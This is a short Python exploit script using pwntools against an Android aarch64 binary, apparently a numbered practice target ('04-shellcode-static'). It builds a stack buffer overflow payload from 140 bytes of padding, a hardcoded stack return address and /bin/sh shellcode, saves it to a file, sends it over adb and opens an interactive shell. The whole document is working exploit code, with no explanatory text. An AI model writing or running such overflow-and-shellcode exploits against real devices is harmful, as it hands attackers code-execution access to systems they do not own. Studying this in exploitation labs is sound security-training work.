#!/usr/bin/python

'''
Stack:

'''

from pwn import *

context(arch='aarch64', endian='little', word_size=64, os='android')

shellcode = asm(shellcraft.sh())
vul_sp = 0x7ffffff6b0
shellcode_addr = vul_sp + 192

payload = 'a' * (128 + 4 + 8)
payload += p64(shellcode_addr)
payload += shellcode
with open('payload', 'wb') as f:
    f.write(payload)

bin_path = '/data/local/tmp/04-shellcode-static'
proc = adb.process([bin_path])
proc.recvuntil('> ')
proc.send(payload)
proc.interactive()
